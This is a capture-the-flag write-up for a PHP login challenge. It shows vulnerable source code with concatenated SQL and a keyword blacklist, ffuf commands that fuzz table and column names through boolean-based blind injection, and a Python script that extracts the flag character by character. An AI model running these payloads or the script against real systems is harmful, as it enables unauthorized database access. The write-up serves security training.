# WEB 00
## SOLUTION
1.  Challenge provides the following source code:
```PHP
<?php
error_reporting(0);
include("db.php");
function check($input){
	  $forbid = "0x|0b|limit|glob|php|load|inject|month|day|now|collationlike|regexp|limit|_|information|schema|char|sin|cos|asin|procedure|trim|pad|make|mid";
      $forbid .= "substr|compress|where|code|replace|conv|insert|right|left|cast|ascii|x|hex|version|data|load_file|out|gcc|locate|count|reverse|b|y|z|--";
      if (preg_match("/$forbid/i", $input) or preg_match('/\s/', $input) or preg_match('/[\/\\\\]/', $input) or preg_match('/(--|#|\/\*)/', $input)) {
      	die('forbidden');
}
}

$user=$_GET['user'];
$pass=$_GET['pass'];
check($user);check($pass);
$sql = @mysqli_fetch_assoc(mysqli_query($db,"SELECT * FROM users WHERE username='{$user}' AND password='{$pass}';"));
 if($sql['username']){
 	echo 'welcome \o/';
 	die();
 }
 else{
 	echo 'wrong !';
 	die();
 }
?>
```
2. Learn how applications query databases  
* We see that the application has blacklisted quite a few keywords related to SQLi, but that's not enough.  
* Pay attention to the line of code used to get the user whose username and password match the user, we see here the clear use of string concatenation ⇒ SQLi
3. Prove that SQLi exists
  <img width="1523" height="1022" alt="image" src="https://github.com/user-attachments/assets/108cdc86-2986-45bd-9c23-8c3da8fc8f77" />
  <img width="1465" height="950" alt="image" src="https://github.com/user-attachments/assets/dfe49f77-8162-49ff-a53a-40748b0881be" />
4. We see that the application has blocked all keys related to dumping information about tables in the database such as: `information`, `schema`, `table`, `_`, .. we can still extract the names of the tables through the character-by-character method, but we will do a simpler way which is to fuzz the table names.
  
* We see that when the query does not cause an error with the db, there is a response returned.
  
  <img width="1454" height="999" alt="image" src="https://github.com/user-attachments/assets/eac15379-189d-4a85-8961-8faa4d90d8b4" />
  
* When the query fails, the response returns nothing.
  
  <img width="1468" height="951" alt="image" src="https://github.com/user-attachments/assets/8ea638a4-6553-487f-81b5-a7d9bf7a478f" />  

* From there we proceed to fuzz based on the condition: If the fuzz table name in the wordlist actually exists on the db ⇒ the query has no errors ⇒ the response has returned results
* Use nmap's wordlist at
  
  <img width="1601" height="838" alt="image" src="https://github.com/user-attachments/assets/68a7bd4e-c6c1-4142-a8d1-ee156cb92089" />
5. Use the FFUF tool to find the table name as follows
```
ffuf -u "http://103.197.184.163:12113/?user=1&pass=2'or(select'a'from(FUZZ))='a" -w /usr/share/sqlmap/data/txt/common-tables.txt -mr "welcome \\\\o/" -c
```
* Finding a valid table name does not cause the query to fail.

  <img width="1597" height="822" alt="image" src="https://github.com/user-attachments/assets/38dd4e66-a7c8-4ef7-bb93-07aa8e484596" />
6. Use the FFUF tool to find column names
```
ffuf -u "http://103.197.184.163:12113/?user=1&pass=2'or(select(FUZZ)from(flag))>'0" -w /usr/share/sqlmap/data/txt/common-columns.txt -mr "welcome \\\\o/" -c
```
* Similarly, we change the position of `FUZZ` to the column position
* Change the condition `=a` to `>0` because we don't know what the value of the column is, but according to ASCII code, the character `0` has the smallest value.  
Result

<img width="1607" height="954" alt="image" src="https://github.com/user-attachments/assets/0e85bf95-e9e8-4525-a2d8-c8beca0f7258" />  
=> We know the column name is also a flag.  
7. Proceed to find the length of the flag  

<img width="1880" height="1087" alt="image" src="https://github.com/user-attachments/assets/70831f58-9092-446e-9659-6080997f1bc2" />  
=> The result found the length of the flag is 27  

<img width="1877" height="945" alt="image" src="https://github.com/user-attachments/assets/bd8f0faf-ad80-443c-a583-aa89bfbbc56d" />  
8. Proceed to dump flag  
We can use the `substring` function to exhaust all characters and find the correct character for each position of the flag, however the `substring` function is blocked, we can use the alias name of `substring` `mid` to perform string slicing

<img width="1457" height="994" alt="image" src="https://github.com/user-attachments/assets/2898f945-7881-4f4a-8d22-86453683d0cb" />  

* In the image above, we see that the first position of the flag has a value greater than the letter `a`
* But in the flag there will be special characters like: `_ {}` , which are blocked so we will convert the blocked characters to ASCII format
Brute-force attack
* With payload 1 being the position of each character in the flag from 1 → 27
* With payload 2 being the match value in ASCII format, including numbers and special characters

```
host = "http://103.197.184.163:12113"
uri = "/?user=1&pass=2"
payload = "'or(select(mid(flag,$index,1))from(flag))=chr($ascii)or'1'='2"
import string
import requests # type: ignore
characters = string.ascii_lowercase + string.digits + '!@#$%^&*(){}[]_'
flag = [0]*27
for index in range(27):
    for c in characters:
        _ascii = ord(c)
        _payload = payload.replace("$index",str(index+1)).replace("$ascii", str(_ascii))
        res = requests.get(
            url=host + uri + _payload
        ).content.decode("utf-8")
        
        if "welcome \\o/" in res:
            flag[index] = c
            print("".join([str(_) for _ in flag]))
            break
print("[*] Found: " + "".join([str(_) for _ in flag]))
```

FROM THE [SOURCE](https://nguyengiangnam.notion.site/WU-PTITCTF-2025-260091b6851e807babfdcce2bba84411)








